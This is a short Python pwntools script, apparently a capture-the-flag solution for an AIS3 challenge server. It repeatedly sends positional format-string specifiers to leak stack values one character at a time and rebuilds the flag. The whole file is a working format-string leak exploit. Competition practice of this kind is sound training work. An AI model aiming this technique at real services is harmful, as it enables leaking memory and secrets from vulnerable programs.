from pwn import *

i = 20
a = 0
flag = ""
prefix = "]%"
suufix = "$"

while a != "7D": 
    p = remote('chals1.ais3.org', 50960)
    temp = prefix + str(i) + suufix
    p.sendlineafter("What format do you want ? ", temp)
    p.recvuntil("Format number : %]")
    a = p.recv()
    flag += chr(int(a))
    print(flag)
    i += 1
